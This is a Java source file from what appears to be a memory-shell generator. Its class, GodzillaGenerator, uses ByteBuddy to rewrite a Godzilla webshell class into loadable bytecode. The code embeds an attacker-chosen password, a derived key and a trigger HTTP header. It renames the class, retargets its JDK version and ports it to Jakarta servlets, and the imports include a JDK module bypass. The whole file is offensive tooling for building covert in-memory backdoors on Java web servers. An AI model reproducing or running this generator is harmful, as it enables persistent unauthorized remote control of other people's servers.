package com.reajason.javaweb.memsell;

import com.reajason.javaweb.buddy.ByPassJdkModuleInterceptor;
import com.reajason.javaweb.buddy.ServletRenameVisitorWrapper;
import com.reajason.javaweb.buddy.TargetJDKVersionVisitorWrapper;
import com.reajason.javaweb.config.Constants;
import net.bytebuddy.ByteBuddy;
import net.bytebuddy.dynamic.DynamicType;
import net.bytebuddy.implementation.FieldAccessor;
import net.bytebuddy.implementation.Implementation;
import net.bytebuddy.implementation.SuperMethodCall;
import net.bytebuddy.jar.asm.Opcodes;
import net.bytebuddy.matcher.ElementMatchers;
import org.apache.commons.codec.digest.DigestUtils;

/**
 * @author ReaJason
 * @since 2024/11/23
 */
public class GodzillaGenerator {

    public static byte[] generate(Class<?> godzillaClass, String godzillaClassName,
                           String pass, String key,
                           String headerName, String headerValue) {
        return generate(godzillaClass, godzillaClassName, pass, key, headerName, headerValue, false, Constants.DEFAULT_VERSION);
    }

    public static byte[] generate(Class<?> godzillaClass, String godzillaClassName, String pass, String key, String headerName, String headerValue, boolean useJakarta, int targetJdkVersion) {
        return generate(godzillaClass, godzillaClassName, pass, key, headerName, headerValue, useJakarta, targetJdkVersion, true);
    }

    public static byte[] generate(Class<?> godzillaClass, String godzillaClassName, String pass, String key, String headerName, String headerValue, boolean useJakarta, int targetJdkVersion, boolean changeClassVersion) {
        String md5Key = DigestUtils.md5Hex(key).substring(0, 16);
        String md5 = DigestUtils.md5Hex(pass + md5Key).toUpperCase();
        Implementation.Composable fieldSets = SuperMethodCall.INSTANCE
                .andThen(FieldAccessor.ofField("pass").setsValue(pass))
                .andThen(FieldAccessor.ofField("key").setsValue(md5Key))
                .andThen(FieldAccessor.ofField("md5").setsValue(md5))
                .andThen(FieldAccessor.ofField("headerName").setsValue(headerName))
                .andThen(FieldAccessor.ofField("headerValue").setsValue(headerValue));

        DynamicType.Builder<?> builder = new ByteBuddy().redefine(godzillaClass)
                .name(godzillaClassName);

        if (changeClassVersion) {
            builder = builder.visit(new TargetJDKVersionVisitorWrapper(targetJdkVersion));
        }

        if (useJakarta) {
            builder = builder.visit(ServletRenameVisitorWrapper.INSTANCE);
        }

        builder = builder.constructor(ElementMatchers.any()).intercept(fieldSets);

        try (DynamicType.Unloaded<?> make = builder.make()) {
            return make.getBytes();
        }
    }
}